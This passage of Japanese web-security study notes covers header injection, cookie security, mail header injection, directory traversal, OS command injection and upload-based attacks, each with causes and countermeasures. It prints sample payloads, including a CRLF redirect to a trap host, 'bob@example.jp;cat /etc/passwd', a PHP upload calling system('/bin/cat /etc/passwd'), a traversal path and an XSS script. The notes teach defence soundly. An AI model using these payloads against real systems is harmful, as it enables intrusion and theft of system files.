   　　　例：http://example.jp/47-020.cgi?url=http://example.jp/%0D%0ALocation:+http://trap.example.com/47-900.php
    2．パラメータに改行(%0D%0A)があるため、元々入っていたLocationヘッダの情報が上書き（最後のLocationヘッダしか読まない）される
    3．罠サイトに入る
    このように改行により新たなHTTPレスポンスヘッダを追加する攻撃をHTTPヘッダ・インジェクション攻撃という。
    HTTPヘッダにSet-Cookieヘッダを加えることでセッションIDを固定することもできる（セッションフィクセーション）。
    また、PageIDを変更することで偽の画面に誘導することもできる。
    
    ・HTTPレスポンス分割攻撃（キャッシュ汚染）
    　・概要
    　　HTTPヘッダ・インジェクション攻撃により複数のHTTPレスポンスを作り出し、キャッシュサーバー（プロキシサーバー）に偽のコンテンツをキャッシュさせる攻撃。
  　　　HTTP/1.1では複数のリクエストをまとめて送信することができたため、HTTPリクエストをHTTPヘッダ・インジェクション攻撃の後に付け加えて
　　　　挿入することでキャッシュサーバーがこの偽のコンテンツを誤認してキャッシュする。
　　　・原因・対策
　　　　HTTPヘッダ・インジェクション攻撃と同様

・原因
　HTTPレスポンスヘッダはテキスト形式で1行に1つのヘッダを定義できる。つまり、ヘッダとヘッダは改行で区切られる。
　この性質を悪用し、リダイレクト先URLやクッキー値として設定されるパラメータ中に改行を挿入した場合、改行がそのままレスポンスとして出力されることが原因。

・対策
　1．外部からのパラメータをHTTPレスポンスヘッダとして出力しない
　　　HTTPレスポンスヘッダを用いる機能の代表はリダイレクトとクッキー生成だが、以下の方針に従うことで外部パラメータを直接ヘッダとして出力する機会は大幅に減少する。
　　　・リダイレクト先をURLとして直接指定するのではなく、固定にするか番号などで指定する
　　　・Webアプリケーション開発ツールの提供するセッション変数を使ってURLを受け渡す
  　　つまり、設計段階から外部パラメータをHTTPレスポンスヘッダとして出力しない検討をする。
    
　2．リダイレクトやクッキー生成を専用APIに任せ、ヘッダ生成するパラメータの改行文字をチェックする
　　　・リダイレクトやクッキー生成を専用APIに任せる
   　　　Webアプリケーション側の言語やライブラリの関数を使うことで予防できる。
 　　　　各言語の提供するHTTPレスポンスヘッダ出力機能
         言語　　　　　　クッキー生成　　　　　　　　　　　  リダイレクト　　　  　　　　　　   　レスポンスヘッダ出力
         PHP　　　　　　 setcookie / setrowcookie         なし（headerを利用）　　　　　　　   header
         Perl+CGI.pm    CGI::Cookie                      redirect                          header
         Java Servlet   HttpServletResponse#addCookie    HttpServletResponse#sendRedirect  HttpServletResponse#setHeader
         ASP.NET        Response.Cookies.Add             Response.Redirect                 Response.AppendHeader
     
     ・ヘッダ生成するパラメータの改行文字をチェックする
     　・URL中の改行はエラーとする
 　　　・クッキー値の改行はパーセントエンコードする
    　　ただし、ライブラリ側でクッキー値をパーセントエンコードしている場合はアプリケーション側でのパーセントエンコードは必要ない。
    　　PHPのsetcookie関数と、PerlのCGI::Cookieモジュールはパーセントエンコードがされてある。
    　　PHPのheader関数をラップして文字種のチェック機能付きのリダイレクト関数を定義した例：
    　　<?php 
          // リダイレクト関数を定義する
          function redirect($url){
            // URLとして不適切な文字があればエラーとして処理終了
            if(!mb_ereg("\\A[-_.!~*'();\\/?:@&=+\\$,%#a-zA-Z0-9] + \\z", $url)){
                die('Bad URL');
            }
            header('Location: ' . $url);
          }
          // 呼び出し例
            $url = isset($_GET['url']) ? $_GET['url'] : '';
            redirect($url);
        ?>
    

-----------------------------------------------------------------------------------------------------------

★　クッキー出力にまるわる脆弱性

　　クッキーにまるわる脆弱性を大別すると、以下になる。
  　1．クッキーを利用すべきでない目的で使っている
  　2．クッキーの出力方法に問題がある
  　クッキーはセッションIDの保管場所として利用すべきであり、データそのものをクッキーに保存してはいけない。
   
◎　クッキーの不適切な利用
　　Webアプリケーションでページをまたがる情報を保存するほうほうとしては、PHPやServletコンテナが提供するセッション管理機構が使われる。
　　セッション管理機構ではセッションIDのみをクッキーに保存、データ自体はWebサーバーのメモリやファイル、DBなどに保存する。
　　一方クッキーに保存すべきでないデータをクッキーに保存すると脆弱性が発生する可能性がある。
  
　　・クッキーに保存すべきでない情報
　　　クッキー値はアプリケーションの利用者によって書き換えが可能である。
 　　 書き換えられると困る情報の典型例は、ユーザーIDや権限情報で、クッキーに保存していたために権限外の操作や情報閲覧ができる場合がある。
  　　クッキーで実現できてセッション変数で実現できないのは、情報の寿命の制御と異なるサーバーとの情報共有の2点だけなので通常はセッション変数を使うべきである。
  　　また、セッション変数は漏洩のしにくさを以下の理由で制御可能である。
  　　・Webアプリケーションで機密性の高い情報を表示する場合にパスワードの再入力を求めることができる。
  　　・セッションに保存されている情報がセッションタイムアウトすれば表示できなくなる。
  　　クッキー自体に情報を保存している場合はこのような制御は不可能である。
    　一方でセッションやサーバーをまたがって情報を保存する必要性がある場合にはクッキーを使用する。
    　使用例としては、ログイン画面でのログイン状態を保持するなどの機能である。
    　この例でもクッキーに保存するのはトークンという乱数であり、パスワードなどのデータをクッキーに保存すべきではない。
    
  参考：パディングオラクル攻撃とMS10-070
  　　一部のWebアプリケーションフレームワークではセッション情報をサーバー側だけでなく、クライアント側のhiddenパラメータやクッキーに暗号化して保存する。
  　　代表例はASP.NETで、ページの状態（ビューステート）をhiddenパラメータに認証状態（フォーム認証チケット）をクッキーに保存する。
  　　しかし、T.DuongとJ.Rizzoの両氏がこれら暗号化された情報がパディングオラクル（暗号解読の手法の名前でオラクルとは無関係）という攻撃手法で解読されることを発表した。
　　　事態を重く見たマイクロソフト社はわずか10日で対策プログラムを開発し、定例外パッチ（MS10-070セキュリティパッチ）として公開した。

◎　クッキーのセキュア属性不備
・概要
　クッキーにはSecureという属性があり、これを指定したクッキーはHTTPSの場合のみブラウザからサーバーに送信される。
　アプリケーションがHTTPS通信を利用していても、セキュア属性のついていないクッキーは平文で送信される可能性があり、盗聴される場合がある。
 
　・攻撃手法と影響
　　1．罠サイトを見たターゲットにHTTPで指定したHTMLを返す
  　2．基本はHTTPS通信を使っていても443ポートに対するHTTPリクエスト（平文）を送信させる罠により、暗号化されていない状態でネットワーク上を流れる
　　3．HTTPリクエスト中のクッキーを盗聴することで、セッションハイジャックができる

・原因
　セキュア属性を付けていないことであるが、つけない主な原因は以下の2種類である。
　1．開発者がセキュア属性について知らない
　2．セキュア属性を付けるとアプリケーションが動かなくなる
 
　・クッキーにセキュア属性を付けられないアプリケーション
　　ショッピングサイトなどのWebアプリケーションはHTTPとHTTPSの両方を使っている。
　　カタログページから商品を選ぶ際にHTTP、決済する段階からHTTPSを利用する。
　　このような場合、セッションIDを保持するクッキーにセキュア属性を設定することは困難である。
　　仮にセッションIDのクッキーにセキュア属性をつけると、HTTPのページではセッションIDのクッキーが受け取れないため、
　　セッション管理機構がつかなくなるためである。
　　HTTP側のページでも、ショッピングバスケットの実現などにセッション管理機構は利用したいため、
　　HTTPSを利用するサイトの多くが、セッションIDのクッキーに対してセキュア属性を付けていないのが現状である。

・対策
　クッキーにセキュア属性を付けることが対策となる。
　
　・セッションIDのクッキーにセキュア属性をつける方法
　　PHPの場合：php.iniで設定
　　session.cookie_secure = On
　　ASP.NETの場合：web.configで設定
　　<configuration>
     <system.web>
        <httpcookies requireSSL = "true" />
     </system.web>
   </configuration
  
　・トークンを用いた対策
　　セッションIDを保持するクッキーにセキュア属性を付けられない場合はトークンを利用してセッションハイジャックを防ぐ。
　　トークンを保持するクッキーにセキュア属性をつけることでHTTPのページとHTTPSのページでセッションを共有しつつ、
　　仮にセッションIDを盗聴されてもHTTPSのページはセッションハイジャックを防げる。
　　PHPの場合：
　　<?php 
    // /dev/urandomによる擬似乱数生成器
    function getToken(){
        $s = file_get_contents('/dev/urandom', false, NULL, 0, 24);
        return base64_encode($s);
    }
       // ここまでで認証成功していると想定
       session_Start();
       session_regenerate_id(true); // セッションIDの再生成
       $token = getToken(); // トークンの生成
       // トークンクッキーはセキュア属性をつけて発行する
       setcookie('token', $token, 0, '', '', true, true);
       $_SESSION['token'] = $token;
   ?>
   HTTPSのページではトークンを確認する
   <?php
    session_start();
    // ユーザーIDの確認（省略）
    // トークンの確認
    $token = $_COOKIE['token'];
    if(! $token || $token != $_SESSION['token']){
        die('認証エラー。トークンが不正です');
    }
   ?>
   <body>トークンをチェックし、認証状態を確認しました</body>
   
   ・なぜトークンにより安全性が確保できるか
　　　1．トークンは認証成功時に一度だけサーバーから出力される
　　　2．トークンはHTTPSのページで生成される（サーバー→ブラウザ）
　　　3．トークンは確実に暗号化されてブラウザから送信される（ブラウザ→サーバー）
　　　4．HTTPSのページを閲覧するにはトークンが必須
   　　トークンがサーバーとブラウザの双方向で確実に暗号化されること、HTTPSのページを閲覧するには
     　第三者が知りえないトークンが必要であることから、安全性が確保されていることとなる。
      
　・セキュア属性以外の属性値に関する注意
　　セッションIDを保持するクッキーの属性
　　1．Domain属性
　　　　Domain属性を指定するのは複数のサーバーでクッキーを共有する場合で通常セッションIDを複数サーバー間で共有する意味はないため、デフォルト状態がもっとも安全な状態。　　
　　2．Path属性
　　　　ディレクトリ毎に異なるセッションIDを発行したい場合は設定が必要だが、通常はデフォルト状態（「path=/」）で問題ない。
　　3．Expires属性
　　　　設定すると、ブラウザ終了後も認証状態を維持できるが、通常は属性をつけずにブラウザ終了と同時にクッキーが削除される状態にする。
　　4．HttpOnly属性
　　　　この属性を付けるとクッキーはJavaScriptから参照できなくなる。セッションIDをJavaScriptから参照する必要はないため、設定するとよい。
    　　PHPの場合：php.iniで設定
      　session.cookie_httponly = 1
   
   
-----------------------------------------------------------------------------------------------------------

★　メール送信の問題

◎　メール送信の問題の概要

　・メールヘッダ・インジェクション脆弱性
　
　・hiddenパラメータによる宛先保持
　　無料で提供されるメール送信用フォームなどには、カスタマイズを簡単に行うことを目的にメールの送信先などをhiddenパラメータとして指定するものがある。
　　こういったフォームではhiddenパラメータの送信先アドレスを任意のアドレスに変更することで迷惑メールの送信に悪用される可能性がある。
　　送信先メールアドレスはhiddenパラメータに保持するのではなく、ソースコードにハードコーディングするか、サーバー上の安全な場所（ファイルやDBなど）に保持すべきである。
  
　・メールサーバーによる第三者中継
　　メールサーバー（Mail Transfer Agent;MTA)の設定に問題があると、第三者のメールを中継する場合がある。
　　このような設定のサーバーは迷惑メールなどの送信に悪用される可能性がある。
　　1．攻撃者は第三者中継をしているサーバーを探して、このサーバー経由でターゲットにメールを送る。
　　2．ターゲットは攻撃者のメールを迷惑メール設定にしているが、このサーバーを通すことで受信するようになる。
　　最近のメールサーバーソフト（MTA)はデフォルト状態で第三者中継を許さない設定になっており、安全になっている。
  
◎　メールヘッダ・インジェクション脆弱性
・概要
　宛先や件名などのメールヘッダを外部から指定する際に改行文字を使ってメールヘッダや本文を追加変更する手法。
　影響は3種類ある。
　1．件名や送信元、本文を改変される
　2．迷惑メールの送信に悪用される
　3．ウイルスメールの送信に悪用される
 
　・攻撃手法と影響
　　お問合せフォームからメールアドレスと本文を送信するとリクエストを受けてメールを受け取る。
　　メールの送信にメール送信関数のmb_send_mail()を使う。
　　mb_send_mail() 
  　　第一引数：宛先メールアドレス　第二引数：件名　第三引数：本文　第四引数：追加のメールヘッダ
    mb_send_mail("wasbook@example.jp", "お問合せがありました", "以下の問い合わせがありましたので対応お願いします\n\n" . $body, "From:" . $from);
    
    1．攻撃1：宛先の追加
    　　1．攻撃者がメール欄に改行を入力できるようにメールアドレスの入力欄をtextarea要素に変更したフォームを用意する。
      　2．Bccで攻撃者にもメールを送信できるように設定することで管理者に気づかれることなくメールを回収できる。
       　この方法ではCcやTo、Reply-Toなどを追加できる。
    
    2．攻撃2：本文の改竄
    　　攻撃1と同様にメールアドレス欄に空行と本文に追加したい文章を書き込むことで本文の改竄ができる。
      　MIMEタイプによっては別の攻撃にもなる。
      　例えば、添付ファイルを送りたい場合はmultipart/mixedという形式にするとファイルを送ることができる。  

・原因
　メールのメッセージ形式をまずは理解する。
　・メールメッセージの形式
 　ヘッダ　　To: wasbook@example.jp
            Subject: =?ISO-2022-JP?B?GyRCTGQkJDlnJG8kOyQsJCIbKEI=?=
                     =?ISO-2022-JP?B?GyRCJGokXiQ3JD8bKEI?=
            From: alice@example.jp
            Content-Type: text/plain; charset=ISO-2022-JP
   空行
   ボディ　　以下の問い合わせがありましたので対応お願いします
   　　　　　発注番号4309の納期を回答ください
        
  このようにメール送信ライブラリの多くはメールメッセージのヘッダから送信先のアドレスを抽出する。
  ヘッダの各フィールドは改行で区切られているため、外部から指定するパラメータに改行を挿入すれば、新たなヘッダを追加できる。
  改行に特別な意味があるのにアプリケーション側でチェックしていない場合は、攻撃の可能性がある。

・対策
　メール送信にsendmailコマンドではなく、専用のライブラリを使用する。
　更に、以下のいずれかを実施する。
　1．外部からのパラメータをメールヘッダに含ませないようにする
　2．外部からのパラメータには改行を含まないようにメール送信時にチェックする
 
　・メール送信には専用のAPIやライブラリを使用する
　　ライブラリを用いるメリット3点。
　　1．sendmailコマンドによるメール送信はメッセージ組み立てをアプリケーションがすべて責任を持たなければならず、脆弱性が入りやすい
　　2．sendmailコマンド呼び出しの際にOSコマンド・インジェクション脆弱性が混入しやすい
　　3．メールヘッダ・インジェクション脆弱性は本来は専用ライブラリで対策されるべき
  
　・外部からのパラメータをメールヘッダに含ませないようにする
　　例えば、Fromヘッダは固定にして、利用者のメールアドレスなどは本文に表示するようにする。
  
  ・外部からのパラメータには改行を含まないようにメール送信時にチェックする
　　メール送信関数を直接呼ぶのではなく、ラッパー関数を作成してラッパー関数側で改行文字をチェックする。
  　ラッパー関数　➡　関数や機能を使いやすくするための簡単な関数のこと。
   
　・保険的対策
　　・メールアドレスのチェック
　　・件名のチェック　➡　制御文字以外にマッチする正規表現でチェックできる。例：if(preg_match('/\A[[:^cntrl:]]{1, 60}\z/u', $subject) == 0 )
　　

-----------------------------------------------------------------------------------------------------------

★　ファイルアクセスにまつわる問題

◎　ディレクトリ・トラバーサル脆弱性
・概要
　外部からのパラメータの形でサーバー上のファイル名を指定できるWebアプリケーションではファイル名に対するチェックが不十分であると、
　アプリケーションの意図しないファイルに対して閲覧や改竄、削除ができる場合がある。
　ディレクトリ・トラバーサル脆弱性の影響
　1．Webサーバー内のファイル閲覧　➡　重要情報の漏洩
　2．Webサーバー内のファイルの改竄、削除　➡　Webコンテンツ改竄によるデマ、誹謗中傷の書き込み
 　　　　　　　　　　　　　　　　　　　　　　 マルウェアのサイトに誘導する仕組みの書き込み
                        　　　　　　　　　　スクリプトファイルや設定ファイル削除によるサーバー機能停止
                                          スクリプトファイル改竄による任意のサーバースクリプト実行

　・攻撃手法と影響
　　1．パラメータに別ファイルへの相対パスを入れることで別ファイルにアクセスされる。
　　アプリケーションによっては、書き込みや削除ができる可能性があり、データの改ざんなどの影響がある。
　　更に、PHPなどのスクリプトファイルに書き込みができると、そのスクリプトをWebサーバー上で実行できるため、
　　外部から不正プログラムをダウンロードされたり、システムに対する不正操作が可能になる。
　　

・原因
　1．ファイル名を外部から指定できる
　2．ファイル名として、絶対パスや相対パスの形で異なるディレクトリを指定できる
　3．組み立てたファイル名に対するアクセスの可否をチェックしていない

・対策
　原因のどれかを対策できればいいため、以下のいずれかを実施する。
　1．外部からファイル名を指定できる仕様を避ける
 　　・ファイル名を固定にする
　　 ・ファイル名をセッション変数に保存する
　　 ・ファイル名を直接していするのはなく番号などで間接的に指定する
   
　2．ファイル名にディレクトリ名が含まれないようにする
　　　まず、ディレクトリ名（../）を含まないようにする。
　　　PHPの場合：basename関数　➡　ディレクトリつきのファイル名を受け取り、最後の名前の部分を返す。
   　　　　　　　$tmpl = basename('../../../../etc/hosts');　➡　hostsを返す

　3．ファイル名を英数字に限定する
　　　攻撃に用いる記号文字が使えないように英数字に限定する。
   　　実装例：
     　if(! preg_match('/\A[a-z0-9]+\z/ui', $tmpl){}

◎　意図しないファイル公開
・概要
　外部から閲覧されるとよくないファイルをWebサーバーの公開ディレクトリに配置している場合、ファイルに対するURLが分かると秘密ファイルの閲覧が可能になる。
　重要情報の漏洩につながるため、公開ディレクトリに非公開ファイルを置かないことである。
 
　・攻撃手法と影響　
　　1．URLにディレクトリ名を指定してファイル一覧を表示する（この機能をディレクトリ・リスティングという）。
　　2．表示されたファイルにアクセスする。

・原因
　非公開ファイルを公開ディレクトリに置いたことが原因。
　公開ディレクトリに置いたファイルを外部から閲覧できる条件は次である。
　1．ファイルが公開ディレクトリに置かれている
　2．ファイルに対するURLを知る手段がある
　3．ファイルに対するアクセス制限がかかっていない
 
　・ファイルに対するURLを知る手段
　　1．ディレクトリ・リスティングが有効
　　2．ファイル名が日付やユーザー名、連番など類推可能
　　3．user.dat, data.txtなどのありがちな名前
　　4．エラーメッセージやほかの脆弱性によりファイルが分かる
　　5．外部サイトからリンクされるなどして検索エンジンに登録される

・対策
　1．アプリケーションの設計時にファイルの安全な格納場所を決める
　2．レンタルサーバーを契約する場合は非公開ディレクトリが利用できることを確認する
 
　・保険的対策
　　ディレクトリ・リスティングを無効にする。
　　Apacheの場合：httpd.confに設定
　　<Directory パス指定>
        Options -Indexes その他のオプション
        その他の設定
    </Directory>
    レンタルサーバーなどの場合：.htaccessに設定
    Options -Indexes
    
　参考：Apacheで特定のファイルを隠す方法
　　　　既存Webサイトで簡単にファイル移動ができない場合がある。
　　　　その場合、ファイルの外部からの閲覧を禁止する設定により対処できる。
　　　　Apacheの場合：htaccessに設定
   　　 <Files "*.txt">  // txtファイルへのアクセスを禁止
            deny from all
        </Files>
    
    
-----------------------------------------------------------------------------------------------------------

★　OSコマンド呼び出しの際に発生する脆弱性

◎　OSコマンド・インジェクション脆弱性
・概要
　Webアプリケーションの開発に用いる言語の多くはシェル経由でOSコマンドを呼び出す機能を提供しており、
　シェルを呼び出せる機能の使い方に問題があると意図しないOSコマンドが実行可能となる。
　攻撃シナリオは以下である。
　1．攻撃用ツールを外部からダウンロードする
　2．ダウンロードしたツールに実行権限を与える
　3．OSの脆弱性を内部から攻撃して管理者権限を得る（Local Exploit）
　4．Webサーバーは攻撃者の思いのままになる
　悪用の例
　・Webサーバー内のファイルの閲覧・改竄・削除
　・外部へのメール送信
　・別のサーバーへの攻撃（踏み台と呼ばれる）
 
　・攻撃手法と影響
　　1．sendmailコマンドを呼び出すメール送信の例
　　　問い合わせフォームで「メールアドレス」と「問い合わせ内容」を送信すると、そのメールアドレス宛に受付のメールを送信する。
　　　1．メールアドレス欄にOSコマンド・インジェクション攻撃用スクリプトを入力する
   　　　bob@example.jp;cat /etc/passwd　
　　　2．送信ボタンを押すと/etc/passwdの内容が表示される
   　 この例では表示だけだが、Webアプリケーションが稼働するユーザー権限で実行できるコマンドはすべて悪用可能となる。
　　　具体的には、ファイルの削除、変更、外部からのファイルダウンロード、ダウンロードした不正ツールの悪用などがあげられる。
　　　また、内部からの攻撃による権限昇格で管理者権限を得ることもできる。
   
   2．オプションを追加指定することによる攻撃
   　アプリケーションが呼び出すOSコマンドによってはオプションの追加により攻撃に悪用される場合がある。
   　Unixのfindコマンドは条件を指定してファイルを探すコマンドだが、-execオプションにより、検索したファイル名に対してコマンドを
   　実行できるため、OSコマンドのオプションを追加指定するだけで想定外のOSコマンドを実行される危険性がある。

・原因
　OSコマンド呼び出しに利用される関数やシステムコールの多くは、シェル経由でコマンドを起動する。　
　シェル経由にすることでパイプ機能やリダイレクト機能などを利用しやすくなる。
　しかし、シェルには複数のコマンドを起動する構文があり、外部からパラメータを操作することで
　元のコマンドと別のコマンドを起動させられる可能性があり、これが原因となる。
　もしくはOSコマンドを呼び出す関数を無意識に利用しており、悪用されることが原因となる2パターンある。
　1．シェル経由でOSコマンドを呼び出す際にシェルのメタ文字がエスケープされていない場合
　2．シェル機能を呼び出せる関数を使用している場合
 
 　1．シェルによる複数コマンド実行
  　　シェルは1行の指定で複数のプログラムを起動する方法がある。
    　実装例：
      $ echo aaa ; echo bbb　// コマンドを続けて実行
      $ echo aaa & echo bbb  // バックグラウンドとフォアグラウンドで実行
      $ echo aaa && echo bbb // 最初のコマンドが成功したら次のコマンド実行
      $ echo aaa || echo bbb // 最初のコマンドが失敗したら次のコマンド実行
      $ wc `ls`              // バッククオートで囲った文字列をコマンドとして実行
      $ echo aaa | wc        // 最初のコマンドの出力を次のコマンドの入力に（パイプ機能）
      
      シェルのメタ文字（;や｜）のエスケープが必要だが、ここでは省略する。
      
 　2．シェル機能を呼び出せる関数を使用している場合
  　　Perlのopen関数は呼び方によってはOSコマンドを実行できる。

・対策
　以下のいずれかを実施する。
　1．OSコマンド呼び出しを使わない実装方法を選択
　2．シェル呼び出し機能のある関数の利用を避ける
　3．外部から入力された文字列をコマンドラインのパラメータに渡さない
 　　具体的にはsendmailコマンドは-tオプションを指定すると、宛先のメールアドレスをコマンドラインで指定する代わりに
   　メール内容のTo,Cc,Bccの各ヘッダから読み取るようになる。そうすると、外部から入力された文字列をコマンドラインに指定しないで済む。
　4．OSコマンドに渡すパラメータを安全な関数によりエスケープする
 　　シェルのエスケープは複雑なため、自作するのではなくライブラリ関数を使うべきである。
   　PHPの場合はescapeshellargが該当する。
 
 　・設計フェーズで対策方針を決定する
  　　1．基本設計フェーズ
    　　・主要な機能の実装方針を決定する際に極力ライブラリを利用するが、やむを得ない場合にOSコマンドを利用する
     　
      2．詳細設計フェーズ
      　・各機能の詳細実装設計の際にシェルを呼び出せる関数の使用をできるだけ避ける
        ・シェル経由の関数しか使えない場合はパラメータを固定にするか、標準入力から指定することを検討する
        
   ・保険的対策
   　　1．パラメータの検証
     　　　入力のバリデーションチェックでパラメータ文字列の文字種を制限する。
　　　 2．アプリケーションの稼働する権限を最小限にする
    　　　コマンドの実行権限はWebアプリケーションの持つ権限となるため、アプリケーション側の権限を最小限にしておく。
　　　 3．WebサーバーのOSやミドルウェアのパッチ適用
    
   参考：内部でシェルを呼び出す関数
   　　PHP ： system()  exec()   passthru()   proc_open()   popen()  shell_exec()   `...`　
 　　　Perl： exec()   system()   `...`   qx/.../   open()
　　　 Ruby： exec()   system()   `...`
   　　

-----------------------------------------------------------------------------------------------------------

★　ファイルアップロードにまつわる問題

◎　ファイルアップロードの問題の概要
アップローダに対する攻撃
・アップロード機能に対するDoS攻撃
　巨大なファイルを連続して送信することでWebサイトに過大な負荷をかけるDoS攻撃（Deninal of Service Attack（サービス妨害攻撃））を仕掛けられる。
　影響として、応答速度の低下やサーバーの停止などがある。
　対策としてアップロードファイルの容量制限が有効。PHPの場合はphp.iniの設定で制限ができる。
　php.iniのファイルアップロードに対する設定項目
　file_uploads　➡　ファイルアップロード機能が利用可能か　　デフォルト値：On
　upload_max_filesize　➡　ファイル当たりの最大容量　　デフォルト値：2Mバイト
　max_file_uploads　➡　送信できるファイル数の上限　　デフォルト値：20
　post_max_size　➡　POSTリクエストのボディサイズの上限　　デフォルト値：8Mバイト
　memory_limit　➡　スクリプトが確保できる最大メモリのバイト数　　デフォルト値：128Mバイト

・サーバー上のファイルをスクリプトとして実行する攻撃
　利用者がアップロードしたファイルがWebサーバーの公開ディレクトリに保存される場合、外部からアップロードしたスクリプトファイルがWebサーバー上で実行できる可能性がある。
　影響として、情報漏洩、ファイル改竄、他サーバーへの攻撃などがある。
　
・仕掛けを含むファイルを利用者にダウンロードさせる攻撃
　仕掛けを含んだファイルを攻撃者がアップロードするもの。
　影響として利用者がファイルを閲覧することでJavaScriptの実行やマルウェアの感染がおこる。
 
・ファイルの権限を越えたダウンロード
　限られた利用者しかダウンロードできないはずのファイルが権限のない利用者までもダウンロードできるようになる。
　多くはファイルに対するアクセス制限がかかっておらず、URLの推測によりファイルがダウンロードできることにある。


◎　アップロードファイルによるサーバー側スクリプト実行
・概要
　利用者がアップロードしたファイルをWebサーバーの公開ディレクトリに保存でき、ファイル名の拡張子としてphp, asp, aspx, jspなど
　スクリプト言語のスクリプトを示す拡張子が指定できるとアップロードしたファイルをスクリプトとしてWebサーバー上で実行できる。
　影響
　・Webサーバー内のファイルの閲覧・改竄・削除
　・外部へのメール送信
　・別のサーバーへの攻撃（踏み台）

　・攻撃手法と影響
　　画像を利用者にアップロードしてもらい、そのまま公開するPHPスクリプトでアップロードファイルを受け取ってディレクトリに保存した後、画像を表示する。
　　1．以下のPHPスクリプトをアップロードする
  　　　<pre>
        <?php system('/bin/cat /etc/passwd');
        ?>
       </pre>
　　2．アップロードしたPHPスクリプトを表示するためにアップロードファイルのリンクをクリックするとサーバー上で実行される　
　　3．OSコマンドによる攻撃が成功し、OSアカウントで実行可能な機能をすべて悪用される 

・原因
　・アップロードしたファイルが公開ディレクトリに保存される
　・アップロード後のファイル名として「.php」や「.asp」などスクリプトを示す拡張子が指定できる

・対策
　原因のどちらか一方でも潰せれば対策になるが、拡張子の制限だけでは対策漏れが生じる可能性があるため、
　公開ディレクトリに保存しない方法を紹介する。
　1．ファイルの格納先を公開ディレクトリからget_upload_file_name関数が返すファイル名に変更
　2．画像のURLをダウンロードスクリプト（アップロードしたファイルを公開ディレクトリに保存しない場合、ファイルをスクリプト経由でダウンロードする目的で使うスクリプト）経由に変更
　3．get_upload_file_name関数では拡張子を取り出し、gif, jpg, pngのいずれかであることを確認
　4．乱数を用いて元の拡張子を持つユニークなファイル名を生成しファイル名の重複をチェック
　5．ファイルをクローズした後、ファイルは削除せず、move_uploaded_file関数で上書きさせる
　6．ダウンロードスクリプトでは拡張子を取得しgif,jpg,png以外をエラーにする
　7．それぞれの拡張子に対応したContent-Typeを出力し、ファイル本体をreadfile関数で読み取り出力
 

◎　ファイルアップロードによるクロスサイトスクリプティング
・概要
　アップロードしたファイルを利用者がダウンロードする際にブラウザがファイルタイプを誤認する場合がある。
　例えば、アプリケーションがPNG画像を想定しているのにも関わらず、画像のデータ中にHTMLタグが含まれていると、
　条件によってはブラウザがHTMLファイルとして認識してしまい、画像ファイルに埋め込まれたJavaScriptを実行する場合があり、
　これがファイルダウンロードによるクロスサイトスクリプティングである。
　攻撃者はHTMLやJavaScriptを仕込んだ画像ファイルやPDFファイルをアップロードして公開する。
　通常ではブラウザはHTMLとは認識しないが、攻撃者がアプリケーション利用者に罠を仕掛けて、アップロードしたファイルが
　HTMLとして認識されるように仕向けて攻撃する。

　・攻撃手法と影響
　　1．画像ファイルによるXSS
　　　1．　<script>alert('XSS');</script>
    　　　上のコードをexample.pngとして保存し、ファイルをアップロードする
　　　2．リンクをクリックすると、コードのJavaScriptが実行される
　　　3．実際は画像を表示するURLを罠サイトに仕込み、iframe要素などでHTMLとして表示させることでJavaScriptを実行する
   　影響として、クッキー値の盗み出しによるなりすまし、Web機能の悪用、画面改変によるフィッシングがある。
    
　　2．PDFに偽装したHTMLファイルによるXSS
  　　1．画像ファイルによるXSS1．と同様のコードをPDFファイルとして保存し、アップロードする
　　　2．アップロードファイルのリンクを右クリックしてショートカットのコピーを選択する
　　　3．このショートカットURLをブラウザのアドレスパーに貼り付ると、以下のようになる
   　　　　http://example.jp/4c-013.php?file=laf12536.pdf
        この？の前に/a.htmlを挿入する　➡　http://example.jp/4c-013.php/a.html?file=laf12536.pdf
　　　4．a.htmlというファイルは存在しないため、パラメータとしてスクリプトに渡され、JavaScriptが実行される
   　　　挿入した文字列（a.html）はPATHINFOと呼ばれ、見かけ上ファイル名のような形でURLにパラメータを埋め込む方法である
     ※　偽装PDFによるXSS脆弱性の原因はContent-Typeの間違いである。
     　　PDFの正しいContent-Typeは「application/pdf」だが、「application/x-pdf」としたことが原因。

・原因
　IE特有の仕様が原因。
　IEはファイルタイプの判定にHTTPレスポンスのContent-Typeヘッダ以外に、URL上の拡張子やファイルの中身を利用する。
　その判定仕様は以下のような挙動をすることが判明している。
　1．コンテンツが画像の場合
　　レスポンスヘッダContent-Typeのほかに、画像ファイルのマジックバイトがファイルタイプの判定に利用される。
　　マジックバイト　➡　ファイルタイプ識別のためにファイルの先頭に置かれた固定の文字列のこと。
　　画像ファイルのマジックバイト
　　・GIF　➡　GIF87a　または　GIF89a
　　・JPEG　➡　\xFF\xD8\xFF
　　・PNG　➡　\x89PNG\x0D\x0A\x1A\x0A
  
  ・Content-Typeとマジックバイトが一致する場合
　　この場合はContent-Typeの示すファイルタイプを採用する
  
  ・Content-Typeとマジックバイトが一致しない場合
　　Content-Typeとマジックバイト両方とも無視され、ファイルの内容からファイルタイプを推測する。
　　ファイルの中身にHTMLタグがあればHTMLと判定する場合もある。

　2．コンテンツが画像以外の場合
　　IEに扱うことのできるContent-Typeの場合、IEはContent-Typeに従って処理する。
　　レジストリのHKEY_CLASSES_ROOT¥MIME¥Database¥Content Typeに登録されている。
　　IEに扱うことのできない種類である場合は、IEはURLに含まれる拡張子からファイルタイプを判定する。

・対策
　・ファイルアップロード時の対策
　　1．拡張子が許可されたものかチェックする（アップロードファイルによるサーバー側スクリプト実行の対策と同様）
　　2．画像の場合はマジックバイトも確認する
  　　PHPの場合、getimagesize関数が利用できる。
    　array getimagesize(string $filename [, array &$imageinfo])
     引数として、画像のファイル名を受け取り、画像の縦横サイズと画像の形式を配列として返す。
    
　・ファイルダウンロード時の対策
　　1．Content-Typeを正しく設定する
  　　　Content-Typeを正しく指定することはすべてのブラウザで必要な処理。
 　　　 ダウンロードスクリプト経由ではなくファイルを公開領域に保存する場合は、Webサーバーの設定を確認する。
    　　Apacheの場合はmime.typesという設定ファイルに保存されている。
　　2．画像の場合はマジックバイトを確認する
  　　　ダウンロードスクリプトを用いてファイルをダウンロードする際には、ダウンロード時にもマジックバイトを確認することで確実な対策になる。
　　3．必要に応じてContent-Dispositionヘッダを設定する
  　　　ダウンロードしたファイルをアプリケーションで開くのではなく、ダウンロードさえしておけばいいという場合は
 　　　 Content-Disposition: attachmentというレスポンスヘッダを指定する方法がある。
     　　Content-Type: application/octet-stream
         Content-Disposition: attachment; filename="hogehoge.pdf" // ファイルを保存する際のデフォルト名
         
　・その他の対策
  　Webアプリケーションの仕様策定時に以下のチェックを行うかどうか検討する。
